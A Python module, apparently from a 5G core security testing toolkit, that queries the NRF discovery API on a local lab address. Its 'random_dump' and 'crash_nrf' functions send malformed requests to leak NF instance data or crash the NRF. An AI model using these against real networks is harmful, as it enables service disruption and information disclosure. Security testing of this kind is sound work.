from src import *
import json

# OK 
def get_nf_info(requester_nf_type, token, nf_type=None,additionnal_data={}, display=True):
    # curl "http://127.0.0.10:8000/nnrf-disc/v1/nf-instances?requester-nf-type=AMF&target-nf-type=UDM" 
    uri = f"/nnrf-disc/v1/nf-instances"
    data = {
        "requester-nf-type" : requester_nf_type,
        "target-nf-type" : nf_type
    }
    data = {**data, **additionnal_data}
    return request_cn("NRF", data, "GET", uri, token=token, display=display)


# KO
def random_dump(token, display=True):
    # curl "http://127.0.0.10:8000/nnrf-disc/v1/nf-instances?requester-nf-type=$randomString&target-nf-type="
    random_string = generate_variables("string")
    return get_nf_info(random_string, token, "", display=display)

# KO
def crash_nrf(token, display=True):
    # curl "http://127.0.0.10:8000/nnrf-disc/v1/nf-instances?requester-nf-type=&target-nf-type="
    return get_nf_info("",token,"", display=display)